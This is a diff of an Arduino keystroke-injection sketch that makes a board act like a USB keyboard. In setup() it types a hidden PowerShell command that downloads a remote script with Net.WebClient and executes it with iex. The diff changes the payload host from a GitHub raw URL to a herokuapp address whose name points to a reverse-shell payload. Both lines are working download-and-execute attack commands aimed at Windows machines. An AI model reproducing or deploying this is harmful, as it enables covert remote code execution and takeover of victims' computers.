@@ -14,7 +14,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(300);
   
-  Keyboard.println(F("powershell -windowstyle hidden iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andreafioraldi/UnoRubber/master/powershell_payload.ps1')"));
+  Keyboard.println(F("powershell -windowstyle hidden iex (New-Object Net.WebClient).DownloadString('https://reverse80.herokuapp.com/payload?file=reverse80_powershell.ps1')"));
 }
 
 void loop() {}
